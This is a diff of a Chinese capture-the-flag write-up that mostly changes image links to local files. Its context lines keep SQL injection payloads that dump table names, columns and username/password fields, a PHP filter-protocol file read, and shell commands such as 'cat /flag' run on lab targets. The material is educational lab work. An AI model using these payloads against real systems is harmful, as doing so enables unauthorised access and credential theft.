@@ -6,11 +6,11 @@
 
 ### 题解：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/B3M7TOQ4ABAGA?)
+![alt text](./img/execF12.jpg)
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/25K7VOQ4AAAEQ?)
+![alt text](img/execping.jpg)
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/JKOPVOQ4AAQFC?)
+![alt text](./img/exec_flag_get.jpg)
 
 ### 总结：
 
@@ -90,11 +90,11 @@ ALTER TABLE words CHANGE flag data VARCHAR(100);-- q
 
 ### 题解：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/6JQL3RQ4ACQGQ?)
+![alt text](./img/lovesql.jpg)
 
 简单的sql注入，没什么好说的，用户名就是admin
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/XEK37RQ4ABADY?)
+![alt text](img/lovesql注入.jpg)
 
 但是这并不是flag，具体解题思路如下：
 
@@ -112,7 +112,7 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 
 /check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/HS5PBRQ4ACAF6?)
+![alt text](./img/lovesql查看表.jpg)
 
 /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
 
@@ -120,15 +120,14 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 
 /check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/7DLPFRQ4ABADY?)
-
+![alt text](./img/lovesql查看列.jpg)
 可见在l0ve1ysq1这个表中有如上三个字段
 
 最后查询字段的内容：
 
 /check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/V5XPVRQ4ABACK?)
+![alt text](./img/lovesql查看字段.jpg)
 
 ---
 
@@ -138,23 +137,22 @@ username=admin' order by 4%23&password=1通过盲注可知没有第四列，即�
 
 查看网页元素后发先有一个action.php文件可以访问，但是每当我们访问的时候，他总会跳转到其他end.php的位置，通过网页抓包并进行重放得如下内容：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/4GYABRY4ABAAM?)
+![alt text](./img/secret重放.jpg)
 
 可以发现注释了一个文件，打开后如下：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/PRVQHRY4AAAEQ?)
+![alt text](./img/secret注释文件.jpg)
 
 代码审计后想要代开flag.php查看，结果：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/ZH7AJRY4AAAGO?)
-
+![alt text](img/secret-flag-php.jpg)
 需要使用filter协议过滤
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/ABIAVRY4ABAAM?)
+![alt text](./img/secret-filter协议.jpg)
 
 最后进行解密：
 
-![](http://www.kdocs.cn/api/v3/office/copy/VzkxQnVnVEtpT2xjdnI4eWVKMTRoQVlFVEFuY3Flc1ppUXVZSkpsUXlRKys5VHFqeWVWdG5kdGZpRzBjdXZCQWpXZk1EYU9qbVd2MWMzeUt5SzF1ampXN3NvdzdRdXdLRFhjKzBHdEtHaGFIdTVhY0x5ak8vZlBnTUhWaE91WDErNjVDaTdKcW4rUnpBMjNrdkl4bmYrL3AyZllEUmJRdGxGdXV6K0JqcjVtQUhTQTBCdEpRbUR3SE5JL3Y4Y2J3NHhYMkcwK0htSCs2cGQvUzdWMDh5N2E4M0VUbGlVYXMvUEptTVNUTUUvY1ZCa1FjYi9mZzIvT3E3Nkw2N0dYVG92SVpHWFUvVm1vPQ==/attach/object/EQVQXRY4ABQDI?)
+![alt text](./img/secret解密.jpg)
 
 ---
 
@@ -453,13 +451,13 @@ cat /flag
 ls /
 ```
 
-![](./image/fenjing1.png)
+![](./img/fenjing1.png)
 
 发现一个`flag_1s_Hrea`的文件，打开查看后是告诉我们flag在环境变量中，于是继续执行下面的命令得到flag
 
 ```bash
 printenv
 ```
-![](./image/fenjing2.png)
+![](./img/fenjing2.png)
 
 ---
